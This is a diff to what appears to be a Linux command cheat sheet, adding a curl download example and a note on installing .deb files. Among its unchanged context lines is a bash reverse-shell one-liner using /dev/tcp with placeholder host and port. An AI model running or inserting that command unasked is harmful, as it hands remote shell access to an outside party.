@@ -211,7 +211,8 @@ Get private IPs:                  ip a | grep 'inet '
 Get public IP:                    curl -L ipinfo.io/ip
 Show active network interfaces:   ifconfig
 Show accesible networks:          netstat -rn
-Download file from server:        wget <url> (wget supports HTTP, HTTPS, and FTP; see curl for a powerful alternative to transfer data from or to a server)
+Download file from server - wget: wget <url> (wget supports HTTP, HTTPS, and FTP; see curl for a powerful alternative to transfer data from or to a server)
+Download file from server - curl: curl -L <url> -o <file>
 Download/upload file using SCP:   scp <source> <destination> e.g.: scp user@192.168.1.23:/root/file.txt transferred.txt | scp file.txt user@192.168.1.23:/home/user/transferred.txt
 
 Start reverse shell:              bash -i >& /dev/tcp/<host>/<port> 0>&1     (requires a bash shell, otherwise wrap it with 'bash -c "<command>"')
@@ -388,6 +389,8 @@ Common commands in apt:
 * Remove package:     sudo apt remove <package>
 * Update package db:  sudo apt update
 * Upgrade packages:   sudo apt upgrade
+
+To install a package from a .deb file use: sudo dpkg -i <file>
 
 
 Automation:
